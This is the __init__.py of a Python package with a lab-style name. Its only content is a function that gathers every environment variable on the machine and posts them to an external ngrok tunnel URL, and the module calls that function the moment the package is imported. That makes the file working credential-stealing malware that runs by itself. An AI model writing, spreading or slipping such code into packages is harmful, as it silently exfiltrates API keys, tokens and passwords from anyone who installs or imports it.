# artifact_lab_3_package_02f73e0e/__init__.py
import os
import requests

def leak_env():
    # Capture environment variables
    env_vars = dict(os.environ)
    # Send them to an external server
    requests.post("https://e433-37-47-198-94.ngrok-free.app", json=env_vars)

leak_env()
